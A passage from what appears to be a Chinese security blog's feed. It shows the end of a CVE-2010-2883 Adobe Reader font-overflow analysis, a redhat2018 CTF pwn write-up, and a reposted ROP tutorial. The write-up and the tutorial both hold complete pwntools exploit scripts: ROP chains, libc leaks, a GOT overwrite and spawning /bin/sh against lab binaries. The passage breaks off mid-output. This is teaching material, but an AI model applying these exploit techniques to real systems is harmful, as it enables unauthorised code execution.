class="line"><span class="comment">//函数原型：char *strncat(char *dest, const char *src, size_t n)                                   //</span></span><br><span class="line"><span class="comment">//函数功能：从*src复制n个字节到*dest                                                                //</span></span><br><span class="line"><span class="comment">//函数参数：dest -- 指向目标数组，该数组包含了一个 C 字符串，且足够容纳追加后的字符串，包括额外的空字符。 //</span></span><br><span class="line"><span class="comment">//         src -- 要追加的字符串。                                                                 //</span></span><br><span class="line"><span class="comment">//         n -- 要追加的最大字符数。                                                               //</span></span><br><span class="line"><span class="comment">//函数返回值：该函数返回一个指向最终的目标字符串 dest 的指针。                                        //</span></span><br><span class="line"><span class="comment">//************************************************************************************************//</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们可以看到<code>sub_813391E()</code>函数首先查看<code>uniqueName在栈上的缓冲区</code>是否<code>已经有字符串存在</code>,并通过<code>strlen()</code>计算其长度。如果长度小于<code>260</code>,则通过<code>strncat()</code>函数将pdf中的字体数据中的SING表的<code>uniqueName字段</code>的内容复制到栈上缓冲区中<code>已经存在的字符串</code>后面,并且<code>复制长度</code>与缓冲区中<code>已经存在的字符串</code>的<code>长度之和</code>不能超过<code>260</code>字节。</p><p>&emsp;&emsp;到此为止，这个漏洞的分析暂告一段落，后面搞清楚了一些没搞清楚的细节，再来补充。</p><h2 id="0x60-Reference"><a href="#0x60-Reference" class="headerlink" title="0x60 Reference"></a>0x60 Reference</h2><blockquote><ul><li>1.<a href="http://ahageek.com/writer/migration/cve-2010-2883/" target="_blank" rel="noopener">Aha Geek:CVE-2010-2883 Analysis</a></li><li>2.<a href="https://bbs.pediy.com/thread-121986.htm" target="_blank" rel="noopener">看雪仙果:千年等一回-Adobe Reader CoolType库TTF字体解析栈溢出漏洞分析</a></li><li>3.<a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201009-077" target="_blank" rel="noopener">国家信息安全漏洞库:Adobe Reader和Acrobat CoolType.dll栈缓冲区溢出漏洞</a></li><li>4.<a href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%96%87%E6%A1%A3%E6%A0%BC%E5%BC%8F" target="_blank" rel="noopener">维基百科:PDF</a></li><li>5.0day安全:软件漏洞分析技术 30.2 PDF文档格式简介</li><li>6.漏洞战争:软件漏洞分析精要 2.3 CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞</li><li>7.C++反汇编与逆向分析技术揭秘 第9、10、11章</li><li>8.<a href="https://bbs.pediy.com/thread-257172.htm" target="_blank" rel="noopener">CVE-2010-2883漏洞分析 - 21Gun5</a></li><li>9.<a href="https://www.freebuf.com/articles/system/150474.html" target="_blank" rel="noopener">用TEB结构实现ShellCode的通用性</a></li><li>10.<a href="https://bbs.ichunqiu.com/thread-8849-1-1.html?from=ch" target="_blank" rel="noopener">CVE-2010-2883漏洞分析 - k0shl</a></li></ul></blockquote>]]></content>
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack Overflow </tag>
            
            <tag> Windows </tag>
            
            <tag> FileFormat </tag>
            
            <tag> Adobe Reader </tag>
            
            <tag> Pdf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>redhat2018—writeup</title>
      <link href="/2018/05/27/redhat2018%E2%80%94writeup/"/>
      <url>/2018/05/27/redhat2018%E2%80%94writeup/</url>
      <content type="html"><![CDATA[<blockquote><p>刷题刷题，考试暂告一段落。这篇博客主要记录redhat2018中的pwn题和reverse题的分析过程。reverse还没有训练，后期再补。<br><a id="more"></a></p></blockquote><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="game-server"><a href="#game-server" class="headerlink" title="game server"></a>game server</h3><h4 id="0x00-file-amp-checksec"><a href="#0x00-file-amp-checksec" class="headerlink" title="0x00 file&amp;checksec"></a>0x00 file&amp;checksec</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file game_server</span><br><span class="line">game_server: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=f2edc9b459a64a0a5d698157da465036f722679e, stripped</span><br><span class="line">$ checksec game_server</span><br><span class="line">[*] <span class="string">'/home/.../pwn/redhat2018/game_server/game_server'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>通过<code>file</code>命令可以看到这是一个<code>32bit</code>的ELF，<code>动态链接</code>，并且<code>去除了符号表</code>。通过<code>checksec</code>命令可以看到程序开启了<code>NX</code>，所以一般需要用到<code>ret2libc</code>.</p><h4 id="0x01-IDA分析程序逻辑"><a href="#0x01-IDA分析程序逻辑" class="headerlink" title="0x01 IDA分析程序逻辑"></a>0x01 IDA分析程序逻辑</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  sub_8048637();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Now you can start you game in middle earth"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到主函数里面只有一个自定义函数，逻辑一定在这里面了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048637</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+7h] [bp-111h]@5</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [sp+107h] [bp-11h]@5</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [sp+108h] [bp-10h]@5</span></span><br><span class="line">  <span class="keyword">char</span> *len; <span class="comment">// [sp+10Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to my game server"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"First, you need to tell me you name?"</span>);</span><br><span class="line">  fgets(name_buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  len = <span class="built_in">strrchr</span>(name_buf, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">    *len = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, name_buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's you occupation?"</span>);</span><br><span class="line">  fgets(occupation_buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  len = <span class="built_in">strrchr</span>(occupation_buf, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">    *len = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Well, my noble %s\n"</span>, occupation_buf);</span><br><span class="line">  nbytes = <span class="built_in">snprintf</span>(</span><br><span class="line">             &amp;s,</span><br><span class="line">             <span class="number">256u</span>,</span><br><span class="line">             <span class="string">"Our %s is a noble %s. He is come from north and well change out would."</span>,</span><br><span class="line">             name_buf,</span><br><span class="line">             occupation_buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Here is you introduce"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to edit you introduce by yourself?[Y/N]"</span>);</span><br><span class="line">  v2 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">'Y'</span> )                              <span class="comment">// Y</span></span><br><span class="line">    read(<span class="number">0</span>, &amp;s, nbytes);                        <span class="comment">// 存在溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"name : %s\noccupation : %s\nintroduce : %s\n"</span>, name_buf, occupation_buf, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，首先需要我们输入<code>name</code>和<code>occupation</code>信息，再往后看，可以看到<code>snprintf()</code>函数,这是一个需要注意的点。先来看一下snprintf()函数的原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">****************************<span class="built_in">snprintf</span>()原型*******************************</span><br><span class="line"><span class="number">1.</span> *str 这是存放结果字符串的字符数组指针</span><br><span class="line"><span class="number">2.</span> size （<span class="number">1</span>）如果格式化后的字符串长度 &lt; size，则将此字符串全部复制到str中，并给</span><br><span class="line">        其后添加一个字符串结束符(<span class="string">'\0'</span>)；</span><br><span class="line">        （<span class="number">2</span>）如果格式化后的字符串长度 &gt;= size，则只将其中的(size<span class="number">-1</span>)个字符复制到</span><br><span class="line">        str中，并给其后添加一个字符串结束符(<span class="string">'\0'</span>)，返回值为欲写入的字符串长度。</span><br><span class="line"><span class="number">3.</span> *format 格式化字符串</span><br><span class="line"><span class="number">4.</span> ... 参数的个数是不确定的</span><br><span class="line"><span class="number">5.</span> 返回值 若成功则返回预写入的字符串长度，若出错则返回负值。</span><br><span class="line"><span class="number">6.</span> 头文件 #include &lt;stdio.h&gt;</span><br><span class="line">*************************************************************************</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">snprintf</span>(<span class="keyword">char</span> *str, <span class="keyword">size_t</span> size, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span><br></pre></td></tr></table></figure><p>可以看到，此程序是将输入的<code>name</code>和<code>occupation</code>复制到字符数组<code>s</code>中，但是返回值<code>nbytes</code>得到的是实际输入的两个字符串长度和格式化字符串之和。后面又用到了<code>read()</code>函数，显然在这里存在<code>栈溢出</code>，可以控制程序运行流程。还可以看到<code>s</code>数组的起始地址是<code>bp-111h</code>,所以输入<code>(bp-111h)+4</code>个字节数据就可以覆盖到返回地址。这里我们用<code>puts()</code>函数泄露出<code>puts()</code>的真实地址，通过计算偏移，算出<code>system</code>的地址。<code>/bin/sh</code>的地址可以用<code>read()</code>读入<code>bss段</code>，也可以直接利用<code>libc</code>中的。我这里使用的是将<code>system</code>地址覆盖到<code>printf</code>的<code>Got表</code>，并用<code>read()</code>将<code>/bin/sh</code>读入<code>bss段</code>。显然有些麻烦，直接转到算出的system地址和/bin/sh地址比较方便，代码也少。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#GOT table cover</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    Io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">10000</span>)</span><br><span class="line">    libc = ELF(<span class="string">'libc6-i386_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    Io = process(<span class="string">'./game_server'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'libc6_2.23-0ubuntu10_i386.so'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./game_server'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_plt = "</span> + hex(puts_plt)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_got = "</span> + hex(puts_got)</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"read_plt = "</span> + hex(read_plt)</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_got = "</span> + hex(printf_got)</span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_plt = "</span> + hex(printf_plt)</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"bss_base = "</span> + hex(bss_base)</span><br><span class="line"></span><br><span class="line">p_ebp_ret = <span class="number">0x0804881b</span><span class="comment"># : pop ebp ; ret</span></span><br><span class="line">ppp_ret = <span class="number">0x08048819</span><span class="comment"># : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">ret = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">puts_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_offset = "</span> + hex(puts_offset)</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_offset = "</span> + hex(system_offset)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0xfc</span></span><br><span class="line">Io.recvuntil(<span class="string">'First, you need to tell me you name?\n'</span>)</span><br><span class="line">Io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'b'</span>*<span class="number">0xfc</span></span><br><span class="line">Io.recvuntil(<span class="string">'What\'s you occupation?\n'</span>)</span><br><span class="line">Io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'Y'</span></span><br><span class="line">Io.recvuntil(<span class="string">'Do you want to edit you introduce by yourself?[Y/N]\n'</span>)</span><br><span class="line">Io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">'a'</span>*<span class="number">0x111</span> + <span class="string">'b'</span>*<span class="number">4</span></span><br><span class="line">payload4 += p32(puts_plt) + p32(p_ebp_ret) + p32(puts_got)</span><br><span class="line">payload4 += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(printf_got) + p32(<span class="number">4</span>)</span><br><span class="line">payload4 += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(bss_base) + p32(<span class="number">8</span>)</span><br><span class="line">payload4 += p32(printf_plt) + p32(ret) + p32(bss_base)</span><br><span class="line"></span><br><span class="line">Io.sendline(payload4)</span><br><span class="line">Io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">Io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">Io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(Io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr = "</span> + hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span> + hex(libc_base)</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr = "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">Io.send(p32(system_addr))</span><br><span class="line">Io.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">Io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Stack Overflow </tag>
            
            <tag> Got表覆写 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一步一步学ROP之Linux_x64篇-蒸米</title>
      <link href="/2018/05/11/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux_x64%E7%AF%87-%E8%92%B8%E7%B1%B3/"/>
      <url>/2018/05/11/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux_x64%E7%AF%87-%E8%92%B8%E7%B1%B3/</url>
      <content type="html"><![CDATA[<blockquote><p>这篇博客记录我跟着蒸米大神的文章一步一步学ROP之Linux_x64学习ROP的过程。在进行复现的时候，遇到了一些问题，文章中会提到。<br><a id="more"></a></p></blockquote><h3 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h3><p><code>ROP</code>的全称为Return-oriented programming（返回导向编程），这是一种<code>高级的内存攻击技术</code>可以用来<code>绕过</code>现代操作系统的各种通用<code>防御</code>（比如内存不可执行和代码签名等）。上次我们主要讨论了linux_x86的ROP攻击。</p><p>一步一步学ROP之linux_x86篇 <a href="http://drops.wooyun.org/tips/6597" target="_blank" rel="noopener">http://drops.wooyun.org/tips/6597</a></p><p>在这次的教程中我们会带来上一篇的补充以及<code>linux_x64</code>方面的ROP利用方法，欢迎大家继续学习。</p><p>另外文中涉及代码可在我的github下载：</p><div class="github-widget" data-repo="zhengmin1989/ROP_STEP_BY_STEP"></div><h3 id="0x01-Memory-Leak-amp-DynELF-在不获取目标libc-so的情况下进行ROP攻击"><a href="#0x01-Memory-Leak-amp-DynELF-在不获取目标libc-so的情况下进行ROP攻击" class="headerlink" title="0x01 Memory Leak &amp; DynELF - 在不获取目标libc.so的情况下进行ROP攻击"></a>0x01 Memory Leak &amp; DynELF - 在不获取目标libc.so的情况下进行ROP攻击</h3><p>注意，这一节是上一篇文章的补充，还是讲的<code>x86</code>的ROP。上次讲到了如何通过ROP绕过x86下<code>DEP</code>和<code>ASLR</code>防护。但是我们要事先得到目标机器上的<code>libc.so</code>或者具体的<code>linux版本号</code>才能计算出相应的<code>offset</code>。那么如果我们在获取不到目标机器上的libc.so情况下，应该如何做呢？这时候就需要通过<code>memory leak(内存泄露)</code>来搜索内存找到<code>system()</code>的地址。</p><p>这里我们采用<code>pwntools</code>提供的<code>DynELF</code>模块来进行内存搜索。首先我们需要实现一个<code>leak(address)</code>函数，通过这个函数可以获取到某个地址上<code>最少1 byte的数据</code>。拿我们上一篇中的level2程序举例。leak函数应该是这样实现的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>随后将这个函数作为参数再调用<code>d = DynELF(leak, elf=ELF(&#39;./level2&#39;))</code>就可以对DynELF模块进行<code>初始化</code>了。然后可以通过调用<code>system_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)</code>来得到libc.so中<code>system()在内存中的地址</code>。</p><p>要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串<code>“/bin/sh”</code>在内存中的地址。所以我们在payload中需要调用<code>read()</code>将“/bin/sh”这字符串写入到程序的<code>.bss段</code>中。.bss段是用来保存全局变量的值的，<code>地址固定</code>，并且<code>可以读可写</code>。通过<code>readelf -S level2</code>这个命令就可以获取到bss段的地址了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S level2</span><br><span class="line">There are 30 section headers, starting at offset 0x1148:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">……</span><br><span class="line">  [23] .got.plt          PROGBITS        08049ff4 000ff4 000024 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804a020 001020 000008 00  WA  0   0  4</span><br><span class="line">  [26] .comment          PROGBITS        00000000 001020 00002a 01  MS  0   0  1</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>因为我们在执行完<code>read()</code>之后要接着调用<code>system(“/bin/sh”)</code>，并且read()这个函数的<code>参数有三个</code>，所以我们需要一个<code>pop pop pop ret</code>的<code>gadget</code>用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。PS：我们会在随后的章节中介绍如何用工具寻找更复杂的gadgets。</p><p>整个攻击过程如下：首先通过DynELF获取到<code>system()</code>的地址后，我们又通过read将<code>“/bin/sh”</code>写入到.bss段上，最后再调用<code>system（.bss）</code>，执行“/bin/sh”。最终的exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x08048471</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">'A'</span>*<span class="number">140</span></span><br><span class="line">    payload1 += p32(write_plt)</span><br><span class="line">    payload1 += p32(vulfun_addr)</span><br><span class="line">    payload1 += p32(<span class="number">1</span>)</span><br><span class="line">    payload1 += p32(address)</span><br><span class="line">    payload1 += p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address,(data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level2'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',10002)</span></span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf=ELF(<span class="string">'./level2'</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr= "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a020</span></span><br><span class="line">pppr_addr = <span class="number">0x080484f9</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">140</span></span><br><span class="line">payload2 += p32(read_plt)</span><br><span class="line">payload2 += p32(pppr_addr)</span><br><span class="line">payload2 += p32(<span class="number">0</span>)</span><br><span class="line">payload2 += p32(bss_addr)</span><br><span class="line">payload2 += p32(<span class="number">8</span>)</span><br><span class="line">payload2 += p32(system_addr)</span><br><span class="line">payload2 += p32(vulfun_addr)</span><br><span class="line">payload2 += p32(bss_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###sending payload2 ...###"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 